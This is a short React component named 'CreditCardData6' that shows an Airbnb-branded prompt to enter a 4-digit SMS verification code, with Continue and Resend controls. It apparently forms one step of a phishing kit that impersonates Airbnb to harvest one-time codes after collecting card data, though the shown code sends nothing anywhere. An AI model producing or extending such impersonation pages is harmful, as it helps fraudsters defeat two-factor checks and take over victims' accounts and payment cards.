import React from 'react'
import Button from 'react-bootstrap/esm/Button'
import { NavLink } from 'react-router-dom'

export const CreditCardData6 = () => {
    return (
        <div className="d-flex justify-content-center align-items-center vh-100">
            <div className="message-box">
                <h4 style={{ fontSize: '15px', color: 'black' }}>Confirm your number</h4>
                <p style={{ fontSize: '10px', color: 'black' }}>
                    Enter the 4-digit code Airbnb just sent you to the +34XXX XXX XXX
                </p>

                <div className="form-group">
                    <input type="text" id="phoneNumber" className="form-control" placeholder="_ _ _ _" />
                </div>
                <br />
                <Button variant="primary" style={{ marginLeft: '50%' }}>Continue</Button>
                <br /><br />
                <div className="form-group form-check" style={{ display: 'flex', alignItems: 'center' }}>
                    <p style={{ fontSize: '12px', color: 'black', marginRight: '20px' }}>
                        Haven't you received the SMS?
                    </p>
                    <NavLink to="/resend" style={{ marginBottom: '20px', fontSize: '13px', color: 'black' }}>Resend</NavLink>
                </div>


            </div>
        </div>
    )
}
